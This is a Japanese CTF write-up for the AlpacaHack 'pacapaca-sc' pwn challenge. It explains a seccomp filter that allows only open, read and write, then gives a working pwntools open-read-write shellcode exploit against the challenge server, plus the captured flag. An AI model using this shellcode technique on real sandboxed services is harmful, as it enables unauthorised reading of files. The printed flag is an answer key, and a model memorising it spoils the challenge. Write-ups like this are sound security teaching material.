# pacapaca-sc Writeup
<https://alpacahack.com/daily/challenges/pacapaca-sc>

## 1. 概要
本問題は提供されたバイナリに対してシェルコードを送信し，サーバー上のフラグを読み取るPwn問題です．プログラムには `seccomp` によるシステムコールの制限がかけられており，一般的な `/bin/sh` の起動（`execve`）は封じられています．

## 2. 問題の分析

### ファイル構成
* `chal.c`: プログラムのソースコード
* `chal`: コンパイル済みのバイナリ
* `Dockerfile` / `compose.yaml`: サーバーの実行環境設定

### ソースコードの確認（chal.c）
プログラムの主な処理は以下の通りです．

1.  **メモリ確保**: `mmap` を使用して`PROT_READ | PROT_WRITE | PROT_EXEC`（読み書き実行可能）な領域を確保します．
2.  **入力の受け取り**: `read(0, shellcode, 0x1000)` により，標準入力から最大 0x1000 バイトのデータを確保した領域に読み込みます．
3.  **Seccompの設定**: `seccomp_init(SCMP_ACT_KILL)` で全てのシステムコールを禁止したあと，以下の4つのみを明示的に許可します．
    * `read`
    * `write`
    * `open`
    * `openat`
4.  **実行**: 読み込んだシェルコードを関数として実行します．

## 3. 脆弱性と攻略方針

### 脆弱性
プログラムが任意のシェルコードを実行できる状態（Shellcode Injection）にあることが最大の脆弱性です．しかし，`seccomp` によって `execve` が禁止されているため，直接シェルを起動することはできません．

### 攻略方針：ORWシェルコード
許可されているシステムコール `open`, `read`, `write` を組み合わせることで，以下の手順でフラグを取得できます．

1.  **Open**: `/flag.txt` を開いてファイルディスクリプタ（FD）を取得する．
2.  **Read**: 取得した FD からフラグの内容をメモリ（スタック等）に読み込む．
3.  **Write**: メモリに読み込んだ内容を標準出力（FD 1）に書き出す．

## 4. エクスプロイトコード

`pwntools` を利用して，ORWシェルコードを生成し送信するスクリプトを作成しました．
<https://github.com/shinya00000/ctf/blob/main/alpacahack/daily-2026-04/pacapaca-sc/solve.ipynb>

```python
from pwn import *

# 接続先設定
HOST = '34.170.146.252'
PORT = 39313

# アーキテクチャ設定
context.clear(arch='amd64')

# ORWシェルコードの構築
sc = shellcraft.open('/flag.txt')
sc += shellcraft.read('rax', 'rsp', 0x100)
sc += shellcraft.write(1, 'rsp', 0x100)

shellcode = asm(sc)

# 送信
p = remote(HOST, PORT)
p.recvuntil(b"paca?\n")
p.send(shellcode)

# 結果の受け取り
print(p.recvall().decode(errors='ignore'))
```

## 5. フラグの獲得

スクリプトを実行した結果，サーバーから以下のフラグが返されました．

**Flag:**
`Alpaca{Okay!!!repeat_after_me!!open->read->write:)FOOOOOOOOOOOOOO!!!!}`